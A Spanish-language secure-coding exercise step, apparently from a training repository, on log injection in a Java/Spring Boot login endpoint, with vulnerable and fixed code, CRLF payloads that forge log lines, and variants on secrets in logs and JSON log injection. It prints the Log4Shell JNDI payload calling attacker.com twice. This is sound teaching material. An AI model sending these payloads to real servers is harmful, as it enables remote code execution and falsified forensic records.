# Paso 9 — Log Injection
**Tecnologia:** Java / Spring Boot | **OWASP:** A09:2021 - Security Logging and Monitoring Failures | **CWE-117**

---

## Que es esta vulnerabilidad?

Log Injection ocurre cuando una aplicacion escribe input del usuario directamente en logs sin sanitizar los caracteres de control. Un atacante puede inyectar saltos de linea (`\n`, `\r`) para insertar lineas falsas en el registro, haciendo que parezca que han ocurrido eventos legitimos que nunca sucedieron, o que han ocultado eventos reales.

Los logs son la fuente principal de evidencia forense y deteccion de ataques. Si un atacante puede falsificarlos, puede:
- Ocultar su actividad maliciosa insertando "ruido" que diluya las alertas reales
- Falsificar eventos de login exitoso para confundir analistas
- Inyectar lineas que activen reglas SIEM incorrectas (falsos positivos)
- En sistemas con log parsers inseguros, explotar JNDI Injection via Log4Shell (CVE-2021-44228)

---

## Donde ocurre en este codigo?

**Archivo:** `src/java/src/main/java/com/example/api/controller/AuthController.java`

```java
// CODIGO VULNERABLE — estado actual del ejercicio
@PostMapping("/login")
public ResponseEntity<?> login(@RequestParam String username,
                               @RequestParam String password) {
    log.info("Login attempt for user: " + username);  // username sin sanitizar
    return ResponseEntity.ok(Map.of("message", "OK"));
}
```

El problema esta en la concatenacion `"Login attempt for user: " + username`. Si `username` contiene `\n`, el logger escribe dos lineas separadas. El atacante controla el contenido completo de la segunda linea.

En SLF4J/Logback, el log resultante en disco seria literalmente:
```
2026-05-20 INFO Login attempt for user: admin
INFO Login successful for user: admin  <- linea falsa inyectada
```

---

## Como lo explotaria un atacante

**Inyeccion de evento falso de login exitoso:**
```
POST /api/auth/login
username=alice%0AINFO+Login+successful+for+user:+alice
password=wrongpassword
```

El log mostrara:
```
INFO Login attempt for user: alice
INFO Login successful for user: alice
```

Un analista revisando el log asumira que el login fue exitoso cuando en realidad fallo.

**Inyeccion de lineas para activar alertas falsas:**
```
username=admin%0ACRITICAL+SQL+INJECTION+DETECTED+from+192.168.1.100
```

Genera una alerta critica falsa que distrae al equipo de seguridad (cortina de humo).

**Log4Shell (CVE-2021-44228) — la forma mas grave de log injection:**
```
username=${jndi:ldap://attacker.com/exploit}
```

Log4j 2 evaluaba expresiones JNDI dentro de los mensajes de log. Al loguear este input, el servidor hacia una conexion LDAP al servidor del atacante y ejecutaba el codigo descargado. Afecto a millones de servidores en 2021.

---

## Tu tarea: aplicar la mitigacion

Modifica `AuthController.java` para sanitizar el username antes de escribirlo en logs:

```java
// CODIGO SEGURO
private static String sanitizeForLog(String input) {
    if (input == null) return "null";
    // Eliminar caracteres de control (saltos de linea, tabuladores, etc.)
    String sanitized = input.replaceAll("[\\r\\n\\t]", "_");
    // Limitar longitud para evitar logs anormalmente largos
    if (sanitized.length() > 100) {
        sanitized = sanitized.substring(0, 100) + "[truncado]";
    }
    return sanitized;
}

@PostMapping("/login")
public ResponseEntity<?> login(@RequestParam String username,
                               @RequestParam String password) {
    // Usar logging parametrizado Y sanitizacion del input
    log.info("Login attempt for user: {}", sanitizeForLog(username));
    return ResponseEntity.ok(Map.of("message", "OK"));
}
```

### Por que funciona esta mitigacion?

- **Eliminar `\r`, `\n`, `\t`:** estos caracteres son los que permiten dividir lineas en el log. Sin ellos, el input del usuario no puede crear nuevas entradas en el registro.
- **Logging parametrizado (`{}`):** SLF4J con `{}` trata el argumento como dato opaco, no como patron de formato. Previene ataques de formato de string (aunque en Java/SLF4J el riesgo es menor que en C). Mejora tambien el rendimiento al no construir el string si el nivel de log no esta activo.
- **Limite de longitud:** un input de 100MB en un log generaria un archivo enorme. Truncar a 100 caracteres previene el DoS por disco lleno via logs.

---

## Variantes de la misma categoria (Logging Failures — mas complejas)

### Variante A: Log4Shell — JNDI Injection via Log4j (CVE-2021-44228)

Esta es la variante mas catastrofica de log injection. Log4j 2 incluia un mecanismo de "lookup" que evaluaba expresiones `${...}` dentro de mensajes de log:

```java
// VULNERABLE — Log4j 2 < 2.15.0 (practicamente cualquier Java app en 2021)
// No hay codigo incorrecto del desarrollador: Log4j lo hace internamente
logger.info("User agent: {}", request.getHeader("User-Agent"));
// Si User-Agent = ${jndi:ldap://attacker.com/x}, Log4j hace una conexion LDAP
// y ejecuta la clase Java descargada -> RCE
```

```java
// MITIGACION — actualizar Log4j a >= 2.17.1 y deshabilitar lookups
// En log4j2.xml:
// <Configuration>
//   <Properties>
//     <Property name="log4j2.formatMsgNoLookups">true</Property>
//   </Properties>
// </Configuration>
// O con JVM flag: -Dlog4j2.formatMsgNoLookups=true
```

---

### Variante B: Datos sensibles en logs (contratasenas, tokens)

```java
// VULNERABLE — loguear el cuerpo completo de la peticion
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    log.info("Login request: {}", req.toString());  // incluye la contrasena en texto plano
    // ...
}
```

Si `LoginRequest.toString()` incluye todos los campos (comportamiento por defecto de Lombok `@ToString`), la contrasena queda en texto plano en los logs.

```java
// SEGURO — excluir campos sensibles del toString y loguear solo lo necesario
@ToString(exclude = {"password", "token", "creditCard"})
public class LoginRequest {
    private String username;
    private String password;  // excluido del toString por @ToString(exclude)
}

@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    log.info("Login attempt for user: {}", sanitizeForLog(req.getUsername()));
    // La contrasena nunca aparece en logs
}
```

---

### Variante C: Log Injection en logging estructurado (JSON logs)

En sistemas modernos que usan JSON para logs estructurados, un atacante puede inyectar campos JSON adicionales:

```python
# VULNERABLE — input del usuario interpolado en JSON de log
import logging, json

logger = logging.getLogger()

@router.post("/login")
async def login(username: str):
    # Si username = '", "isAdmin": true, "x": "', el JSON del log queda malformado
    # o inyecta el campo isAdmin en el evento de log
    log_entry = f'{{"event": "login", "user": "{username}"}}'
    logger.info(log_entry)
```

Payload: `username=x", "isAdmin": true, "user": "x`

```python
# SEGURO — usar logging estructurado con serializacion correcta
import structlog

log = structlog.get_logger()

@router.post("/login")
async def login(username: str):
    safe_user = sanitize_for_log(username)
    log.info("login_attempt", user=safe_user)  # structlog serializa correctamente
```

---

## Referencias

- [OWASP A09:2021 - Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [CVE-2021-44228 - Log4Shell](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 09** exige que `AuthController.java` contenga:
- `sanitizeForLog`
- `replaceAll`
- La desaparicion del log vulnerable por concatenacion